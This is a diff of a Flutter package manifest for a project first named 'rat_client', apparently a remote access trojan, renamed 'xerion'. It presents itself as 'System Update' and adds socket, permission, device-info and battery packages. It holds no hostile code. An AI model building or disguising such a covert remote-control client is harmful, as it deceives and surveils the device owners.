@@ -1,16 +1,25 @@
-name: rat_client
-description: System Update
+name: xerion
+description: "System Update"
 publish_to: 'none'
-version: 1.0.0+1
+version: 6.0.0
 
 environment:
-  sdk: '>=3.0.0 <4.0.0'
+  sdk: ^3.8.1
 
 dependencies:
   flutter:
     sdk: flutter
+  http: ^0.13.5
   socket_io_client: ^2.0.3+1
+  shared_preferences: ^2.2.2
   device_info_plus: ^10.1.0
+  permission_handler: ^11.0.0
+  battery_plus: ^6.0.0
+
+dev_dependencies:
+  flutter_test:
+    sdk: flutter
+  flutter_lints: ^5.0.0
 
 flutter:
   uses-material-design: true
